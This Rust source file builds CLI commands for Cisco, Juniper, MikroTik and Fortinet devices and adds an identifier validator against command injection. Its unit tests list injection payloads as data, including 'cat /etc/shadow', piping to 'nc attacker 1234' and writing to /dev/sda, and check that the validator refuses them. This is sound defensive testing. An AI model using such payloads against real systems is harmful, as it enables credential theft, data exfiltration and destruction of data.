//! Network Equipment Command Builder
//!
//! Builds commands for network devices (Cisco IOS, `JunOS`, `MikroTik`, Fortinet, generic).
//! Network equipment uses non-POSIX shells, so commands are sent as-is without
//! shell escaping — `shell::escape` would wrap a value in single quotes that a
//! Cisco or Juniper CLI would not strip.
//!
//! Not escaping is not the same as not VALIDATING, and that distinction was
//! missing. Identifiers reaching a command — an interface name, a config
//! section — are checked by [`validate_identifier`]; caller-supplied COMMAND
//! text (`build_config_command`) is the tool's payload by design and is
//! governed by the destructive gate and the blacklist instead.

use crate::error::{BridgeError, Result};

/// Reject an identifier that could break out of the command it is placed in.
///
/// Measured before this existed: `build_show_interfaces_command(Juniper,
/// Some("eth0; id"))` produced `show interfaces eth0; id extensive`, and the
/// same for `$(id)`, backticks and `&&`. Every shell metacharacter passed
/// straight through. The only thing between that and execution is the
/// blacklist — and `validate_builtin` deliberately SKIPS the whitelist for
/// specialised tools, on the assumption that they validate their own inputs.
/// This module did not, which breaks that contract.
///
/// The allowed set is what real identifiers need and nothing more:
/// `GigabitEthernet0/0/1`, `ge-0/0/0.0`, `xe-1/2/3:4`, `Vlan100`, and section
/// names like `router bgp` — hence letters, digits, space and `/._-:`.
///
/// Refused rather than escaped: there is no escaping that is correct across a
/// POSIX shell AND a Cisco CLI AND a `JunOS` CLI, so the safe move is to admit
/// only values that need no escaping anywhere.
///
/// # Errors
///
/// Returns [`BridgeError::CommandDenied`] when the value is empty, over 128
/// characters, or contains anything outside the allowed set.
pub fn validate_identifier(kind: &str, value: &str) -> Result<()> {
    if value.is_empty() {
        return Err(BridgeError::CommandDenied {
            reason: format!("{kind} must not be empty"),
        });
    }
    if value.len() > 128 {
        return Err(BridgeError::CommandDenied {
            reason: format!("{kind} is too long (max 128 characters)"),
        });
    }
    if let Some(bad) = value
        .chars()
        .find(|c| !(c.is_ascii_alphanumeric() || matches!(c, ' ' | '/' | '.' | '_' | '-' | ':')))
    {
        return Err(BridgeError::CommandDenied {
            reason: format!(
                "{kind} contains {bad:?}, which is not allowed: only letters, digits, \
                 space and / . _ - : may appear in a device identifier"
            ),
        });
    }
    Ok(())
}

/// Equipment vendor/OS type.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EquipmentType {
    /// Cisco IOS/IOS-XE
    Cisco,
    /// Juniper `JunOS`
    Juniper,
    /// `MikroTik` `RouterOS`
    MikroTik,
    /// Fortinet `FortiOS`
    Fortinet,
    /// Generic / auto-detect
    Generic,
}

impl EquipmentType {
    /// Parse from string (case-insensitive).
    #[must_use]
    pub fn from_str_loose(s: &str) -> Self {
        match s.to_lowercase().as_str() {
            "cisco" | "ios" => Self::Cisco,
            "juniper" | "junos" => Self::Juniper,
            "mikrotik" | "routeros" => Self::MikroTik,
            "fortinet" | "fortios" | "fortigate" => Self::Fortinet,
            _ => Self::Generic,
        }
    }
}

/// Builds commands for network equipment.
pub struct NetworkEquipmentCommandBuilder;

impl NetworkEquipmentCommandBuilder {
    /// Build show running-config command.
    ///
    /// # Errors
    ///
    /// Returns [`BridgeError::CommandDenied`] if `section` is not a valid
    /// identifier — see [`validate_identifier`].
    pub fn build_show_run_command(
        equipment: EquipmentType,
        section: Option<&str>,
    ) -> Result<String> {
        if let Some(s) = section {
            validate_identifier("section", s)?;
        }
        Ok(match equipment {
            EquipmentType::Cisco => {
                if let Some(s) = section {
                    format!("show running-config | section {s}")
                } else {
                    "show running-config".to_string()
                }
            }
            EquipmentType::Juniper => "show configuration | display set".to_string(),
            EquipmentType::MikroTik => "/export".to_string(),
            EquipmentType::Fortinet => "show full-configuration".to_string(),
            EquipmentType::Generic => "show running-config".to_string(),
        })
    }

    /// Build show interfaces command.
    ///
    /// # Errors
    ///
    /// Returns [`BridgeError::CommandDenied`] if `interface` is not a valid
    /// identifier — see [`validate_identifier`].
    pub fn build_show_interfaces_command(
        equipment: EquipmentType,
        interface: Option<&str>,
    ) -> Result<String> {
        if let Some(i) = interface {
            validate_identifier("interface", i)?;
        }
        Ok(match equipment {
            EquipmentType::Cisco => {
                if let Some(i) = interface {
                    format!("show interfaces {i}")
                } else {
                    "show ip interface brief".to_string()
                }
            }
            EquipmentType::Juniper => {
                if let Some(i) = interface {
                    format!("show interfaces {i} extensive")
                } else {
                    "show interfaces terse".to_string()
                }
            }
            EquipmentType::MikroTik => "/interface print".to_string(),
            EquipmentType::Fortinet => "get system interface".to_string(),
            EquipmentType::Generic => "show interfaces".to_string(),
        })
    }

    /// Build show routes command.
    #[must_use]
    pub fn build_show_routes_command(equipment: EquipmentType) -> String {
        match equipment {
            EquipmentType::Cisco | EquipmentType::Generic => "show ip route".to_string(),
            EquipmentType::Juniper => "show route".to_string(),
            EquipmentType::MikroTik => "/ip route print".to_string(),
            EquipmentType::Fortinet => "get router info routing-table all".to_string(),
        }
    }

    /// Build show ARP command.
    #[must_use]
    pub fn build_show_arp_command(equipment: EquipmentType) -> String {
        match equipment {
            EquipmentType::Cisco | EquipmentType::Generic => "show arp".to_string(),
            EquipmentType::Juniper => "show arp no-resolve".to_string(),
            EquipmentType::MikroTik => "/ip arp print".to_string(),
            EquipmentType::Fortinet => "get system arp".to_string(),
        }
    }

    /// Build show version command.
    #[must_use]
    pub fn build_show_version_command(equipment: EquipmentType) -> String {
        match equipment {
            EquipmentType::Cisco | EquipmentType::Juniper | EquipmentType::Generic => {
                "show version".to_string()
            }
            EquipmentType::MikroTik => "/system resource print".to_string(),
            EquipmentType::Fortinet => "get system status".to_string(),
        }
    }

    /// Build show VLANs command.
    #[must_use]
    pub fn build_show_vlans_command(equipment: EquipmentType) -> String {
        match equipment {
            EquipmentType::Cisco | EquipmentType::Generic => "show vlan brief".to_string(),
            EquipmentType::Juniper => "show vlans".to_string(),
            EquipmentType::MikroTik => "/interface vlan print".to_string(),
            EquipmentType::Fortinet => "show system interface | grep vlan".to_string(),
        }
    }

    /// Build config command (wraps in configure mode).
    #[must_use]
    pub fn build_config_command(equipment: EquipmentType, commands: &str) -> String {
        match equipment {
            EquipmentType::Cisco => {
                format!("configure terminal\n{commands}\nend")
            }
            EquipmentType::Juniper => {
                format!("configure\n{commands}\ncommit\nexit")
            }
            EquipmentType::MikroTik | EquipmentType::Generic => commands.to_string(),
            EquipmentType::Fortinet => {
                format!("config system global\n{commands}\nend")
            }
        }
    }

    /// Build save config command.
    #[must_use]
    pub fn build_save_command(equipment: EquipmentType) -> String {
        match equipment {
            EquipmentType::Cisco | EquipmentType::Generic => "write memory".to_string(),
            EquipmentType::Juniper => "request system configuration rescue save".to_string(),
            EquipmentType::MikroTik => "/system backup save name=mcp-backup".to_string(),
            EquipmentType::Fortinet => "execute backup config flash".to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ===================== identifier injection =====================
    //
    // Measured before `validate_identifier` existed:
    //   build_show_interfaces_command(Juniper, Some("eth0; id"))
    //     -> "show interfaces eth0; id extensive"
    // and the same for `$(id)`, backticks and `&&`. Every metacharacter passed
    // through. `validate_builtin` deliberately SKIPS the whitelist for
    // specialised tools, on the assumption they validate their own inputs —
    // this module did not, which broke that contract.

    /// The exact payloads that reached the command unaltered.
    #[test]
    fn shell_metacharacters_in_an_interface_are_refused() {
        for payload in [
            "eth0; id",
            "eth0$(id)",
            "eth0`id`",
            "eth0 && cat /etc/shadow",
            "eth0 | nc attacker 1234",
            "eth0\nshow running-config",
            "eth0 > /dev/sda",
            "eth0 & ",
        ] {
            let err = NetworkEquipmentCommandBuilder::build_show_interfaces_command(
                EquipmentType::Juniper,
                Some(payload),
            )
            .expect_err("a metacharacter must be refused, not interpolated");
            assert!(
                err.to_string().contains("interface"),
                "the refusal must name what was rejected: {err}"
            );
        }
    }

    #[test]
    fn shell_metacharacters_in_a_section_are_refused() {
        for payload in ["interface; id", "interface$(id)", "interface`id`"] {
            assert!(
                NetworkEquipmentCommandBuilder::build_show_run_command(
                    EquipmentType::Cisco,
                    Some(payload)
                )
                .is_err(),
                "{payload} must be refused"
            );
        }
    }

    /// The rule must not break real device identifiers. These are the shapes
    /// operators actually type; refusing them would make the fix worse than
    /// the bug.
    #[test]
    fn real_device_identifiers_are_accepted() {
        for name in [
            "eth0",
            "GigabitEthernet0/0/1",
            "ge-0/0/0.0",
            "xe-1/2/3:4",
            "Vlan100",
            "Port-channel1",
            "ether1",
        ] {
            NetworkEquipmentCommandBuilder::build_show_interfaces_command(
                EquipmentType::Cisco,
                Some(name),
            )
            .unwrap_or_else(|e| panic!("{name} is a real interface name and must pass: {e}"));
        }
        // Section names legitimately contain a space.
        NetworkEquipmentCommandBuilder::build_show_run_command(
            EquipmentType::Cisco,
            Some("router bgp"),
        )
        .expect("a section name may contain a space");
    }

    #[test]
    fn an_empty_or_overlong_identifier_is_refused() {
        assert!(validate_identifier("interface", "").is_err());
        assert!(validate_identifier("interface", &"a".repeat(129)).is_err());
        validate_identifier("interface", &"a".repeat(128)).expect("128 is the limit, not past it");
    }

    /// A caller-supplied CONFIG BLOCK is the tool's payload, not an identifier:
    /// `ssh_net_equip_config` exists to apply configuration lines. It is
    /// deliberately NOT validated here — its guard is the destructive gate and
    /// the blacklist. Pinned so the distinction is not "tightened" away by
    /// someone reading only the injection tests above.
    #[test]
    fn a_config_block_is_a_payload_and_stays_uninspected() {
        let cmd = NetworkEquipmentCommandBuilder::build_config_command(
            EquipmentType::Cisco,
            "interface Gi0/1\n description set by mcp",
        );
        assert!(cmd.starts_with("configure terminal"), "{cmd}");
        assert!(cmd.contains("description set by mcp"), "{cmd}");
    }

    #[test]
    fn test_equipment_type_parse() {
        assert_eq!(EquipmentType::from_str_loose("cisco"), EquipmentType::Cisco);
        assert_eq!(EquipmentType::from_str_loose("IOS"), EquipmentType::Cisco);
        assert_eq!(
            EquipmentType::from_str_loose("juniper"),
            EquipmentType::Juniper
        );
        assert_eq!(
            EquipmentType::from_str_loose("mikrotik"),
            EquipmentType::MikroTik
        );
        assert_eq!(
            EquipmentType::from_str_loose("fortinet"),
            EquipmentType::Fortinet
        );
        assert_eq!(
            EquipmentType::from_str_loose("unknown"),
            EquipmentType::Generic
        );
    }

    #[test]
    fn test_show_run_cisco() {
        let cmd =
            NetworkEquipmentCommandBuilder::build_show_run_command(EquipmentType::Cisco, None)
                .unwrap();
        assert_eq!(cmd, "show running-config");
    }

    #[test]
    fn test_show_run_cisco_section() {
        let cmd = NetworkEquipmentCommandBuilder::build_show_run_command(
            EquipmentType::Cisco,
            Some("interface"),
        )
        .unwrap();
        assert!(cmd.contains("section interface"));
    }

    #[test]
    fn test_show_run_juniper() {
        let cmd =
            NetworkEquipmentCommandBuilder::build_show_run_command(EquipmentType::Juniper, None)
                .unwrap();
        assert!(cmd.contains("display set"));
    }

    #[test]
    fn test_show_run_mikrotik() {
        let cmd =
            NetworkEquipmentCommandBuilder::build_show_run_command(EquipmentType::MikroTik, None)
                .unwrap();
        assert_eq!(cmd, "/export");
    }

    #[test]
    fn test_show_interfaces_cisco() {
        let cmd = NetworkEquipmentCommandBuilder::build_show_interfaces_command(
            EquipmentType::Cisco,
            None,
        )
        .unwrap();
        assert!(cmd.contains("ip interface brief"));
    }

    #[test]
    fn test_show_interfaces_cisco_specific() {
        let cmd = NetworkEquipmentCommandBuilder::build_show_interfaces_command(
            EquipmentType::Cisco,
            Some("GigabitEthernet0/1"),
        )
        .unwrap();
        assert!(cmd.contains("GigabitEthernet0/1"));
    }

    #[test]
    fn test_show_routes() {
        assert!(
            NetworkEquipmentCommandBuilder::build_show_routes_command(EquipmentType::Cisco)
                .contains("ip route")
        );
        assert!(
            NetworkEquipmentCommandBuilder::build_show_routes_command(EquipmentType::Juniper)
                .contains("show route")
        );
        assert!(
            NetworkEquipmentCommandBuilder::build_show_routes_command(EquipmentType::MikroTik)
                .contains("/ip route")
        );
    }

    #[test]
    fn test_show_arp() {
        assert!(
            NetworkEquipmentCommandBuilder::build_show_arp_command(EquipmentType::Cisco)
                .contains("show arp")
        );
        assert!(
            NetworkEquipmentCommandBuilder::build_show_arp_command(EquipmentType::MikroTik)
                .contains("/ip arp")
        );
    }

    #[test]
    fn test_show_version() {
        assert!(
            NetworkEquipmentCommandBuilder::build_show_version_command(EquipmentType::Cisco)
                .contains("show version")
        );
        assert!(
            NetworkEquipmentCommandBuilder::build_show_version_command(EquipmentType::MikroTik)
                .contains("resource print")
        );
    }

    #[test]
    fn test_config_cisco() {
        let cmd = NetworkEquipmentCommandBuilder::build_config_command(
            EquipmentType::Cisco,
            "interface Gi0/1\nno shutdown",
        );
        assert!(cmd.starts_with("configure terminal"));
        assert!(cmd.ends_with("end"));
    }

    #[test]
    fn test_config_juniper() {
        let cmd = NetworkEquipmentCommandBuilder::build_config_command(
            EquipmentType::Juniper,
            "set interfaces ge-0/0/0 disable",
        );
        assert!(cmd.contains("commit"));
    }

    #[test]
    fn test_save() {
        assert_eq!(
            NetworkEquipmentCommandBuilder::build_save_command(EquipmentType::Cisco),
            "write memory"
        );
        assert!(
            NetworkEquipmentCommandBuilder::build_save_command(EquipmentType::Juniper)
                .contains("rescue save")
        );
    }
}
